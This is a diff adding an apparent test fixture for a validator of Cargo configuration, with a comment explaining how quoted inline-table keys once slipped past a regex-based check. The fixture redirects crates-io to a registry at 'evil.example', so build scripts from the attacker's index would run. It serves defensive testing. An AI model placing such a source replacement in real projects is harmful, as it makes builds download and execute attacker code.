@@ -1,0 +1,7 @@
+# Finding 1 (RC4): inline-table with a QUOTED key. The old hand-rolled inline-
+# table body matcher `/([A-Za-z-]+)\s*=.../` was quote-blind, so a quoted key
+# inside the inline table returned [] → silent ALLOW while crates + build.rs ran
+# from the attacker index. A real TOML parser honors quoted inline-table keys.
+[source]
+crates-io = { "replace-with" = "m" }
+m = { 'registry' = "sparse+https://evil.example/api/index/" }
